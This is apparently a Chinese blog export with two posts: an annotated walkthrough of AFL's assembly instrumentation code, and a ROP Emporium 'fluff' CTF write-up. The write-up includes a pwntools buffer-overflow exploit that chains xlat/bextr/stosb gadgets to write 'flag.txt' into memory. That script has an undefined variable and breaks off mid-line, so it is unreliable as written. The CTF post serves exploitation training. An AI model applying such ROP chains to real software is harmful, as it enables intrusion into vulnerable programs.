class=\"line\">      instrument_next = <span class=\"number\">0</span>;</span><br><span class=\"line\">      ins_lines++;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">fputs</span>(line, outf);</span><br></pre></td></tr></table></figure>\n<p>a-3. 对于插桩的核心处理，定位有跳转语句， 设置flag</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">if</span> (pass_thru) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class=\"line\"><span class=\"comment\">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class=\"line\"><span class=\"comment\">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span> &amp;&amp; line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;.&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class=\"line\"><span class=\"comment\">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class=\"line\"><span class=\"comment\">         around them, so we use that as a signal. */</span></span><br><span class=\"line\"><span class=\"comment\">// 匹配文件中声明的段</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;p2align &quot;</span>, <span class=\"number\">8</span>) &amp;&amp;</span><br><span class=\"line\">          <span class=\"built_in\">isdigit</span>(line[<span class=\"number\">10</span>]) &amp;&amp; line[<span class=\"number\">11</span>] == <span class=\"string\">&#x27;\\n&#x27;</span>) skip_next_label = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;text\\n&quot;</span>, <span class=\"number\">5</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t.text&quot;</span>, <span class=\"number\">13</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t__TEXT,__text&quot;</span>, <span class=\"number\">21</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section __TEXT,__text&quot;</span>, <span class=\"number\">21</span>)) &#123;</span><br><span class=\"line\">        instr_ok = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>; </span><br><span class=\"line\">        <span class=\"comment\">// 尝试匹配.text，匹配成功设置标志位为1(即可以插桩)</span></span><br><span class=\"line\">        <span class=\"comment\">// 进入下一次迭代</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section\\t&quot;</span>, <span class=\"number\">8</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;section &quot;</span>, <span class=\"number\">8</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;bss\\n&quot;</span>, <span class=\"number\">4</span>) ||</span><br><span class=\"line\">          !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">2</span>, <span class=\"string\">&quot;data\\n&quot;</span>, <span class=\"number\">5</span>)) &#123;</span><br><span class=\"line\">        instr_ok = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class=\"line\"><span class=\"comment\">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class=\"line\"><span class=\"comment\">       seen, and we do not instrument. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class=\"line\"><span class=\"comment\">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;.att_syntax&quot;</span>)) skip_intel = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;#&#x27;</span> || line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;#&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;#APP&quot;</span>)) skip_app = <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;#NO_APP&quot;</span>)) skip_app = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class=\"line\"><span class=\"comment\">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class=\"line\"><span class=\"comment\">       we want to catch:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">         ^main:      - function entry point (always instrumented)</span></span><br><span class=\"line\"><span class=\"comment\">         ^.L0:       - GCC branch label</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class=\"line\"><span class=\"comment\">         ^\\tjnz foo  - conditional branches</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">       ...but not:</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">         ^# BB#0:    - clang comments</span></span><br><span class=\"line\"><span class=\"comment\">         ^ # BB#0:   - ditto</span></span><br><span class=\"line\"><span class=\"comment\">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LC0       - GCC non-branch labels</span></span><br><span class=\"line\"><span class=\"comment\">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class=\"line\"><span class=\"comment\">         ^\\tjmp foo  - non-conditional jumps</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class=\"line\"><span class=\"comment\">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class=\"line\"><span class=\"comment\">       later on.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class=\"line\">        line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;#&#x27;</span> || line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27; &#x27;</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class=\"line\"><span class=\"comment\">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class=\"line\"><span class=\"comment\">       branch destination label (handled later on). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;j&#x27;</span> &amp;&amp; line[<span class=\"number\">2</span>] != <span class=\"string\">&#x27;m&#x27;</span> &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class=\"line\">                R(MAP_SIZE));</span><br><span class=\"line\"></span><br><span class=\"line\">        ins_lines++;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"><span class=\"comment\">// 捕捉跳转标志，调用随机数函数，选择是否进行插桩</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class=\"line\"><span class=\"comment\">       tread carefully and account for several different formatting</span></span><br><span class=\"line\"><span class=\"comment\">       conventions. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((colon_pos = <span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;:&quot;</span>))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;L&#x27;</span> &amp;&amp; <span class=\"built_in\">isdigit</span>(*(colon_pos - <span class=\"number\">1</span>))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;:&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;.&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* __APPLE__ */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"built_in\">isdigit</span>(line[<span class=\"number\">1</span>]) || (clang_mode &amp;&amp; !<span class=\"built_in\">strncmp</span>(line, <span class=\"string\">&quot;LBB&quot;</span>, <span class=\"number\">3</span>)))</span><br><span class=\"line\">            &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"built_in\">isdigit</span>(line[<span class=\"number\">2</span>]) || (clang_mode &amp;&amp; !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">1</span>, <span class=\"string\">&quot;LBB&quot;</span>, <span class=\"number\">3</span>)))</span><br><span class=\"line\">            &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* __APPLE__ */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* An optimization is possible here by adding the code only if the</span></span><br><span class=\"line\"><span class=\"comment\">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class=\"line\"><span class=\"comment\">             That said, this complicates the code by requiring two-pass</span></span><br><span class=\"line\"><span class=\"comment\">             processing (messy with stdin), and results in a speed gain</span></span><br><span class=\"line\"><span class=\"comment\">             typically under 10%, because compilers are generally pretty good</span></span><br><span class=\"line\"><span class=\"comment\">             about not generating spurious intra-function jumps.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">             We use deferred output chiefly to avoid disrupting</span></span><br><span class=\"line\"><span class=\"comment\">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class=\"line\"><span class=\"comment\">             MacOS X). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!skip_next_label) instrument_next = <span class=\"number\">1</span>; <span class=\"keyword\">else</span> skip_next_label = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Function label (always instrumented, deferred mode). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        instrument_next = <span class=\"number\">1</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"b-trampoline插桩代码\">b. trampoline插桩代码</h5>\n<p>这些部分的声明在afl-as.h</p>\n<h6 id=\"b-1-bss段变量\">b-1 .bss段变量</h6>\n<ul>\n<li><code>__afl_area_ptr</code>：共享内存地址；</li>\n<li><code>__afl_prev_loc</code>：上一个插桩位置（id为R(100)随机数的值）；</li>\n<li><code>__afl_fork_pid</code>：由fork产生的子进程的pid；</li>\n<li><code>__afl_temp</code>：缓冲区；</li>\n<li><code>__afl_setup_failure</code>：标志位，如果置位则直接退出；</li>\n<li><code>__afl_global_area_ptr</code>：全局指针。</li>\n</ul>\n<h6 id=\"b-1-trampoline-fmt-64-32\">b-1.trampoline_fmt_64/32</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static const u8* trampoline_fmt_32 =</span><br><span class=\"line\"></span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;.align 4\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;leal -16(%%esp), %%esp\\n&quot;</span><br><span class=\"line\">  &quot;movl %%edi,  0(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%edx,  4(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%ecx,  8(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%eax, 12(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl $0x%08x, %%ecx\\n&quot;  //想ecx存入随机桩代码</span><br><span class=\"line\">  &quot;call __afl_maybe_log\\n&quot; //调用__afl_maybe_log</span><br><span class=\"line\">  &quot;movl 12(%%esp), %%eax\\n&quot;</span><br><span class=\"line\">  &quot;movl  8(%%esp), %%ecx\\n&quot;</span><br><span class=\"line\">  &quot;movl  4(%%esp), %%edx\\n&quot;</span><br><span class=\"line\">  &quot;movl  0(%%esp), %%edi\\n&quot;</span><br><span class=\"line\">  &quot;leal 16(%%esp), %%esp\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- END --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">static const u8* trampoline_fmt_64 =</span><br><span class=\"line\"></span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;.align 4\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;leaq -(128+24)(%%rsp), %%rsp\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rdx,  0(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rcx,  8(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rax, 16(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq $0x%08x, %%rcx\\n&quot;</span><br><span class=\"line\">  &quot;call __afl_maybe_log\\n&quot;</span><br><span class=\"line\">  &quot;movq 16(%%rsp), %%rax\\n&quot;</span><br><span class=\"line\">  &quot;movq  8(%%rsp), %%rcx\\n&quot;</span><br><span class=\"line\">  &quot;movq  0(%%rsp), %%rdx\\n&quot;</span><br><span class=\"line\">  &quot;leaq (128+24)(%%rsp), %%rsp\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- END --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>主要功能:</p>\n<ul>\n<li>保存 <code>rdx</code>、 <code>rcx</code> 、<code>rax</code> 寄存器</li>\n<li>将 <code>rcx</code> 的值设置为 <code>fprintf()</code> 函数将要打印的变量内容</li>\n<li>调用 <code>__afl_maybe_log</code> 函数</li>\n<li>恢复寄存器</li>\n</ul>\n<h6 id=\"b-2-afl-maybe-log\">b-2. __afl_maybe_log</h6>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;__afl_maybe_log:\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  lahf\\n&quot;</span>   <span class=\"comment\">// 对于标志位的处理</span></span><br><span class=\"line\"><span class=\"string\">&quot;  seto %al\\n&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  /* Check if SHM region is already mapped. */\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  movl  __afl_area_ptr, %edx\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  testl %edx, %edx\\n&quot;</span>    <span class=\"comment\">//判断__afl_area_ptr是否为NULL</span></span><br><span class=\"line\"><span class=\"string\">&quot;  je    __afl_setup\\n&quot;</span>\t<span class=\"comment\">//为NULL则跳转设置</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"Unusual-instruments-flluf-[ROPEmporium-4]","date":"2022-03-01T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n## ROP Emporium-fluff\n\n这个的exp是我写的最没底的一次，可用的gadget少的可怜\n\n根据提示，要去在questionableGadgets里去找\n\n```assembly\n.text:0000000000400628 questionableGadgets:\n.text:0000000000400628                 xlat\n.text:0000000000400629                 retn\n.text:000000000040062A ; -------------------------------------------\n.text:000000000040062A                 pop     rdx\n.text:000000000040062B                 pop     rcx\n.text:000000000040062C                 add     rcx, 3EF2h\n.text:0000000000400633                 bextr   rbx, rcx, rdx\n.text:0000000000400638                 retn\n.text:0000000000400639 ; -------------------------------------------\n.text:0000000000400639                 stosb\n.text:000000000040063A                 retn\n```\n\n查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入\n\n```markdown\nbextr\t\t//从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数\nxlat\t\t//[bx + al] to al\nstosb\t\t//al to [rdi]，然后递增rdi\n```\n\n但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。\n\n然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了\n\n于是还是决定尝试一字一字写入\n\n```c\nfrom pwn import*\n\np = process('./fluff')\ncontext.log_level = 'debug'\n\npd = lambda x:p64(x).decode('unicode_escape')\n\nstosb_rdi_al = 0x400639\nxlat = 0x400628 \nbextr = 0x40062a\ndata_start = 0x601028\npop_rdi = 0x4006a3\npop_rcx_bextr = 0x40062b\nprint_file = 0x400510\nf_char = 0x4003c4\nl_char = 0x4003c5\na_char = 0x400411\ng_char = 0x4003cf\ndot_char = 0x400400\nt_char = 0x4003e0\nx_char = 0x400751\n\n\npayload = 'A'*(0x28) + pd(bextr)\npayload+= pd(0x4000) + pd(f_char-0x3ef2-0xb)\npayload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(l_char-0x3ef2-0x66)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_Sbextr)\npayload+= pd(a_char-0x3ef2-0x6c)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(g_char-0x3ef2-0x61)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(dot_char-0x3ef2-0x67)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(t_char-0x3ef2-0x2e)\npayload+= pd(xlat) + pd(stosb_rdi_al)\n\npayload+= pd(pop_rcx_bextr)\npayload+= pd(x_char-0x3ef2-0x74)\npayload+= 